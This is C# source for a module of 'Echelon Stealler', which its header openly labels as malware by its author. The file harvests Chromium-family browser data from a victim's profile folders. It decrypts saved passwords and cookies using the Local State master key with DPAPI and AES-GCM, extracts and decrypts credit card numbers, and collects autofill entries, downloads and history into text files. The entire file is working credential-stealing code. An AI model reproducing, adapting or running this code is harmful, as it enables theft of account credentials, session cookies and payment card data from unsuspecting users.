///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Echelon
{
    class Chromium
    {
        public static int Passwords = 0;
        public static int Autofills = 0;
        public static int Downloads = 0;
        public static int Cookies = 0;
        public static int History = 0;
        public static int CC = 0;

        static readonly string bd = Path.GetTempPath() + "\\bd" + Help.HWID + ".tmp";
        static readonly string ls = Path.GetTempPath() + "\\ls" + Help.HWID + ".tmp";

        static readonly string[] BrowsersName = new string[]
            {
                "Chrome",
                "Edge",
                "Yandex",
                "Orbitum",
                "Opera",
                "Amigo",
                "Torch",
                "Comodo",
                "CentBrowser",
                "Go!",
                "uCozMedia",
                "Rockmelt",
                "Sleipnir",
                "SRWare Iron",
                "Vivaldi",
                "Sputnik",
                "Maxthon",
                "AcWebBrowser",
                "Epic Browser",
                "MapleStudio",
                "BlackHawk",
                "Flock",
                "CoolNovo",
                "Baidu Spark",
                "Titan Browser",
                "Google",
                "browser"
            };

        #region Passwords

        public static void GetPasswords(string path2save)
        {
            try
            {
                List<string> Browsers = new List<string>();
                List<string> BrPaths = new List<string>
            {
            Help.AppDate,
            Help.LocalData
            };
                var APD = new List<string>();

                foreach (var paths in BrPaths)
                {
                    try
                    {
                        APD.AddRange(Directory.GetDirectories(paths));
                    }
                    catch { }
                }

                foreach (var path in APD)
                {
                    string[] files = null;
                    string result = "";

                    try
                    {
                        Browsers.AddRange(Directory.GetFiles(path, "Login Data", SearchOption.AllDirectories));
                        files = Directory.GetFiles(path, "Login Data", SearchOption.AllDirectories);
                    }

                    catch { }
                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            try
                            {
                                if (File.Exists(file))
                                {
                                    string str = $"Unknown";

                                    foreach (string name in BrowsersName)
                                    {
                                        if (path.Contains(name))
                                        {
                                            str = name;
                                        }
                                    }
                                    string loginData = file;
                                    string localState = file + "\\..\\..\\Local State";

                                    if (File.Exists(bd)) File.Delete(bd);
                                    if (File.Exists(ls)) File.Delete(ls);

                                    File.Copy(loginData, bd);
                                    File.Copy(localState, ls);

                                    SqlHandler sqlHandler = new SqlHandler(bd);
                                    List<PassData> passDataList = new List<PassData>();
                                    sqlHandler.ReadTable("logins");

                                    string keyStr = File.ReadAllText(ls);

                                    string[] lines = Regex.Split(keyStr, "\"");
                                    int index = 0;
                                    foreach (string line in lines)
                                    {
                                        if (line == "encrypted_key")
                                        {
                                            keyStr = lines[index + 2];
                                            break;
                                        }
                                        index++;
                                    }


                                    byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(keyStr)).Remove(0, 5));
                                    byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(keyBytes);
                                    int rowCount = sqlHandler.GetRowCount();

                                    for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                                    {

                                        try
                                        {
                                            string passStr = sqlHandler.GetValue(rowNum, 5);
                                            byte[] pass = Encoding.Default.GetBytes(passStr);
                                            string decrypted = "";

                                            try
                                            {

                                                if (passStr.StartsWith("v10") || passStr.StartsWith("v11"))
                                                {
                                                    byte[] iv = pass.Skip(3).Take(12).ToArray(); // From 3 to 15
                                                    byte[] payload = pass.Skip(15).ToArray();

                                                    decrypted = AesGcm256.Decrypt(payload, masterKeyBytes, iv);
                                                }

                                                else
                                                {
                                                    decrypted = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(pass));
                                                }

                                            }

                                            catch { }

                                            result += "Url: " + sqlHandler.GetValue(rowNum, 1) + "\r\n";
                                            result += "Login: " + sqlHandler.GetValue(rowNum, 3) + "\r\n";
                                            result += "Passwords: " + decrypted + "\r\n";
                                            result += "Browser: " + str + "\r\n\r\n";
                                            Passwords++;
                                        }
                                        catch
                                        {
                                        }
                                    }

                                    File.Delete(bd);
                                    File.Delete(ls);

                                    if (str == "Unknown")
                                    {
                                        File.AppendAllText(path2save + "\\" + $"Passwords_{str}.txt", result);
                                    }

                                    else
                                    {
                                        File.WriteAllText(path2save + "\\" + $"Passwords_{str}.txt", result);
                                    }
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
            }

            catch { }
        }

        #endregion

        #region Cookies

        public static void GetCookies(string path2save)
        {
            try
            {
                List<string> Browsers = new List<string>();
                List<string> BrPaths = new List<string>
            {
            Help.AppDate,
            Help.LocalData
            };
                var APD = new List<string>();

                foreach (var paths in BrPaths)
                {
                    try
                    {
                        APD.AddRange(Directory.GetDirectories(paths));
                    }
                    catch { }
                }

                foreach (var path in APD)
                {
                    string result = "";

                    string[] files = null;


                    try
                    {
                        Browsers.AddRange(Directory.GetFiles(path, "Cookies", SearchOption.AllDirectories));
                        files = Directory.GetFiles(path, "Cookies", SearchOption.AllDirectories);
                    }

                    catch { }
                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            try
                            {
                                if (File.Exists(file))
                                {
                                    string str = $"Unknown";

                                    foreach (string name in BrowsersName)
                                    {
                                        if (path.Contains(name))
                                        {
                                            str = name;
                                        }
                                    }
                                    string loginData = file;
                                    string localState = file + "\\..\\..\\Local State";

                                    if (File.Exists(bd)) File.Delete(bd);
                                    if (File.Exists(ls)) File.Delete(ls);

                                    File.Copy(loginData, bd);
                                    File.Copy(localState, ls);

                                    SqlHandler sqlHandler = new SqlHandler(bd);
                                    List<PassData> passDataList = new List<PassData>();
                                    sqlHandler.ReadTable("cookies");

                                    string keyStr = File.ReadAllText(ls);

                                    string[] lines = Regex.Split(keyStr, "\"");
                                    int index = 0;
                                    foreach (string line in lines)
                                    {
                                        if (line == "encrypted_key")
                                        {
                                            keyStr = lines[index + 2];
                                            break;
                                        }
                                        index++;
                                    }


                                    byte[] keyBytes = Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(keyStr)).Remove(0, 5));
                                    byte[] masterKeyBytes = DecryptAPI.DecryptBrowsers(keyBytes);
                                    int rowCount = sqlHandler.GetRowCount();

                                    for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                                    {
                                        try
                                        {
                                            string valueStr = sqlHandler.GetValue(rowNum, 12);
                                            byte[] value = Encoding.Default.GetBytes(valueStr);
                                            string decrypted = "";

                                            try
                                            {

                                                if (valueStr.StartsWith("v10"))
                                                {
                                                    // Console.WriteLine("!=============== AES 256 GCM COOKIES ============!");

                                                    byte[] iv = value.Skip(3).Take(12).ToArray(); // From 3 to 15
                                                    byte[] payload = value.Skip(15).ToArray();

                                                    decrypted = AesGcm256.Decrypt(payload, masterKeyBytes, iv);
                                                }
                                                else
                                                {
                                                    decrypted = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(value));
                                                }

                                                string host_key = sqlHandler.GetValue(rowNum, 1),
                                name = sqlHandler.GetValue(rowNum, 2),
                                PATH = sqlHandler.GetValue(rowNum, 4),
                                expires_utc = sqlHandler.GetValue(rowNum, 5),
                                secure = sqlHandler.GetValue(rowNum, 6);

                                                result += string.Format("{0}\tFALSE\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", host_key, PATH, secure.ToUpper(), expires_utc, name, decrypted);
                                                Cookies++;
                                            }

                                            catch { }



                                        }
                                        catch { }
                                    }

                                    File.Delete(bd);
                                    File.Delete(ls);

                                    if (str == "Unknown")
                                    {
                                        File.AppendAllText(path2save + "\\" + $"Cookies_{str}.txt", result);
                                    }

                                    else
                                    {
                                        File.WriteAllText(path2save + "\\" + $"Cookies_{str}.txt", result);
                                    }
                                }
                            }
                            catch { }
                        }
                    }
                }
            }

            catch { }
        }

        #endregion

        #region Autofills


        public static void GetCards(string path2save)
        {
            try
            {
                List<string> Browsers = new List<string>();
                List<string> BrPaths = new List<string>
            {
            Help.AppDate,
            Help.LocalData
            };
                var APD = new List<string>();

                foreach (var paths in BrPaths)
                {
                    try
                    {
                        APD.AddRange(Directory.GetDirectories(paths));
                    }
                    catch { }
                }

                foreach (var path in APD)
                {
                    string result = "";
                    string[] files = null;


                    try
                    {
                        Browsers.AddRange(Directory.GetFiles(path, "Web Data", SearchOption.AllDirectories));
                        files = Directory.GetFiles(path, "Web Data", SearchOption.AllDirectories);
                    }

                    catch { }
                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            try
                            {

                                if (File.Exists(file))
                                {
                                    string str = $"Unknown";

                                    foreach (string name in BrowsersName)
                                    {
                                        if (path.Contains(name))
                                        {
                                            str = name;
                                        }
                                    }
                                    string loginData = file;

                                    if (File.Exists(bd)) File.Delete(bd);

                                    File.Copy(loginData, bd);

                                    SqlHandler sqlHandler = new SqlHandler(bd);
                                    List<PassData> passDataList = new List<PassData>();
                                    sqlHandler.ReadTable("credit_cards");
                                    int rowCount = sqlHandler.GetRowCount();
                                    for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                                    {
                                        try
                                        {
                                            string Number = Encoding.UTF8.GetString(DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(rowNum, 4)))),
                                                Name = sqlHandler.GetValue(rowNum, 1),
                                Exp_m = sqlHandler.GetValue(rowNum, 2),
                                Exp_y = sqlHandler.GetValue(rowNum, 3),
                                Billing = sqlHandler.GetValue(rowNum, 9);

                                            result += string.Format("{0}\t{1}/{2}\t{3}\t{4}\r\n******************************\r\n", Name, Exp_m, Exp_y, Number, Billing);
                                            CC++;

                                        }
                                        catch
                                        {
                                        }
                                    }

                                    File.Delete(bd);
                                    File.Delete(ls);

                                    if (str == "Unknown")
                                    {
                                        File.AppendAllText(path2save + "\\" + $"CC_{str}.txt", result);
                                    }

                                    else
                                    {
                                        File.WriteAllText(path2save + "\\" + $"CC_{str}.txt", result);
                                    }

                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
            }

            catch
            {
#if DEBUG
                Console.WriteLine("Исключение сбор карт"); 
#endif
            }
        }

        public static void GetAutofills(string path2save)
        {
            try
            {
                List<string> Browsers = new List<string>();
                List<string> BrPaths = new List<string>
            {
            Help.AppDate,
            Help.LocalData
            };
                var APD = new List<string>();

                foreach (var paths in BrPaths)
                {
                    try
                    {
                        APD.AddRange(Directory.GetDirectories(paths));
                    }
                    catch { }
                }

                foreach (var path in APD)
                {
                    string result = "";

                    //  Console.WriteLine(path);
                    string[] files = null;


                    try
                    {
                        Browsers.AddRange(Directory.GetFiles(path, "Web Data", SearchOption.AllDirectories));
                        files = Directory.GetFiles(path, "Web Data", SearchOption.AllDirectories);
                    }

                    catch { }
                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            try
                            {
#if DEBUG
                                Console.WriteLine(file);
#endif
                                if (File.Exists(file))
                                {
                                    string str = $"Unknown";

                                    foreach (string name in BrowsersName)
                                    {
                                        if (path.Contains(name))
                                        {
                                            str = name;
                                        }
                                    }

                                    string loginData = file;

                                    if (File.Exists(bd)) File.Delete(bd);

                                    File.Copy(loginData, bd);

                                    SqlHandler sqlHandler = new SqlHandler(bd);
                                    List<PassData> passDataList = new List<PassData>();
                                    sqlHandler.ReadTable("autofill");
                                    int rowCount = sqlHandler.GetRowCount();
                                    for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                                    {

                                        try
                                        {
                                            string Name = sqlHandler.GetValue(rowNum, 0),
                            Value = sqlHandler.GetValue(rowNum, 1);

                                            result += string.Format("Name: {0}\r\nValue: {1}\r\n----------------------------\r\n", Name, Value);
                                            Autofills++;
                                        }
                                        catch
                                        {
                                        }
                                    }

                                    File.Delete(bd);
                                    File.Delete(ls);

                                    if (str == "Unknown")
                                    {
                                        File.AppendAllText(path2save + "\\" + $"Autofills_{str}.txt", result);
                                    }

                                    else
                                    {
                                        File.WriteAllText(path2save + "\\" + $"Autofills_{str}.txt", result);
                                    }

                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
            }

            catch { }
        }

        #endregion

        #region Downloads

        public static void GetDownloads(string path2save)
        {
            try
            {
                List<string> Browsers = new List<string>();
                List<string> BrPaths = new List<string>
            {
            Help.AppDate,
            Help.LocalData
            };
                var APD = new List<string>();

                foreach (var paths in BrPaths)
                {
                    try
                    {
                        APD.AddRange(Directory.GetDirectories(paths));
                    }
                    catch { }
                }

                foreach (var path in APD)
                {
                    //  Console.WriteLine(path);
                    string[] files = null;

                    try
                    {
                        Browsers.AddRange(Directory.GetFiles(path, "History", SearchOption.AllDirectories));
                        files = Directory.GetFiles(path, "History", SearchOption.AllDirectories);
                    }

                    catch { }
                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            string result = "";

                            try
                            {

                                if (File.Exists(file))
                                {
                                    string str = $"Unknown ({path})";

                                    foreach (string name in BrowsersName)
                                    {
                                        if (path.Contains(name))
                                        {
                                            str = name;
                                        }
                                    }
                                    string loginData = file;

                                    if (File.Exists(bd)) File.Delete(bd);

                                    File.Copy(loginData, bd);

                                    SqlHandler sqlHandler = new SqlHandler(bd);
                                    List<PassData> passDataList = new List<PassData>();
                                    sqlHandler.ReadTable("downloads");
                                    int rowCount = sqlHandler.GetRowCount();
                                    for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                                    {
                                        try
                                        {
                                            string PATH = sqlHandler.GetValue(rowNum, 3),
                            URL = sqlHandler.GetValue(rowNum, 15);

                                            result += string.Format("URL: {0}\r\nPath: {1}\r\n----------------------------\r\n", URL, PATH);
                                            Downloads++;
                                        }
                                        catch
                                        {

                                        }
                                    }

                                    File.Delete(bd);

                                    File.WriteAllText(path2save + "\\" + $"{str}_Downloads.txt", result);
                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
            }

            catch { }

        }

        #endregion

        #region History

        public static void GetHistory(string path2save)
        {
            try
            {
                List<string> Browsers = new List<string>();
                List<string> BrPaths = new List<string>
            {

            Help.AppDate,
            Help.LocalData
            };
                var APD = new List<string>();

                foreach (var paths in BrPaths)
                {
                    try
                    {
                        APD.AddRange(Directory.GetDirectories(paths));
                    }
                    catch { }
                }

                foreach (var path in APD)
                {
                    string result = "";

                    string[] files = null;


                    try
                    {
                        Browsers.AddRange(Directory.GetFiles(path, "History", SearchOption.AllDirectories));
                        files = Directory.GetFiles(path, "History", SearchOption.AllDirectories);
                    }

                    catch { }
                    if (files != null)
                    {
                        foreach (var file in files)
                        {
                            try
                            {
                                if (File.Exists(file))
                                {
                                    string str = $"Unknown";

                                    foreach (string name in BrowsersName)
                                    {
                                        if (path.Contains(name))
                                        {
                                            str = name;
                                        }
                                    }
                                    string loginData = file;

                                    if (File.Exists(bd)) File.Delete(bd);

                                    File.Copy(loginData, bd);

                                    SqlHandler sqlHandler = new SqlHandler(bd);
                                    List<PassData> passDataList = new List<PassData>();
                                    sqlHandler.ReadTable("urls");
                                    int rowCount = sqlHandler.GetRowCount();
                                    for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                                    {
                                        try
                                        {
                                            string URL = sqlHandler.GetValue(rowNum, 1),
                                                Title = sqlHandler.GetValue(rowNum, 2);

                                            result += string.Format("\r\nTitle: {0}\r\nUrl: {1}", Title, URL);
                                            History++;

                                        }
                                        catch
                                        {
                                        }
                                    }

                                    File.Delete(bd);

                                    if (str == "Unknown")
                                    {
                                        File.AppendAllText(path2save + "\\" + $"History_{str}.txt", result, Encoding.Default);
                                    }

                                    else
                                    {
                                        File.WriteAllText(path2save + "\\" + $"History_{str}.txt", result, Encoding.Default);
                                    }

                                }
                            }
                            catch
                            {
                            }
                        }
                    }
                }
            }

            catch { }
        }

        #endregion
    }

    class PassData
    {
        public string Url { get; set; }
        public string Login { get; set; }
        public string Password { get; set; }
    }
}
